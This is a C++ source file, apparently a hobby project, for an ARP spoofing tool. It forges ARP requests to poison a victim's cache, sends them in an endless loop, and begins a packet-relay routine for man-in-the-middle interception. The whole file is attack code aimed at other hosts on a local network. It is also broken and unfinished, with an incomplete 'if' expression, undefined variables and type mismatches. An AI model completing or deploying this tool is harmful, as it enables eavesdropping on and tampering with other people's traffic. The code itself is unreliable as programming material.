#include "arpspoof.h"

// ARP(Operation opcode, Ipv4Addr target_ip, Ipv4Addr sender_ip, HWAddr target_hw, HWAddr sender_hw);
Ethernet ArpSpoofer::make_infection(session sess) {
    auto ether = Ethernet(*sess.sender_mac, iface.mac(), Ethernet::EtherType::ARP);
    ether/=ARP(ARP::Operation::REQ, *sess.target_ip, *sess.sender_ip, iface.mac(), *sess.sender_mac);
    return ether;
}

void ArpSpoofer::push_relay_packet()
{
    pcap_t* desc = capturer_.retrun_capturer();
    int res = 0;
    while((res = pcap_next_ex(desc, &capturer_.pkthdr,&capturer_.packet))) {
        if(res == 0) continue;           
        Ethernet my_eth = Ethernet();
        IP my_ip = IP();
        my_eth /= my_ip;    
        bytes b = bytes(pkt, pkt+sizeof(Ethernet)+sizeof(IP));
        my_eth.deserialize(b);
        for(auto s : sessions) {
            if( my_eth.src_mac().mac() == s.sender_mac->mac() ){
                if( my_ip. )
                    goto EX; 
            }     
                
        }
        continue;
EX: 
        if((uint16_t)my_eth.type() != (uint16_t)Ethernet::EtherType::IP ) 
            continue;
        

    }
}

void ArpSpoofer::run()
{
    vector<session> ifv;    
    for (auto sess : sessions)
        ifv.push_back(make_infection(sess));        
    
    while(not relay_qeue.empty()) {
        arp_sender.send_packet(relay_qeue.front()->serialize());
        relay_qeue.pop();
    }

    while (true) {
        for (auto vir : ifv)
            arp_sender.send_packet(e.serialize());
        usleep(300);
    }
}

int main(int argc, char* argv[]) {
    auto ss = session(string(argv[2]), string(argv[3]),string(argv[1]));
    auto ar = ArpSpoofer(string("wlp2s0"), ss);    
}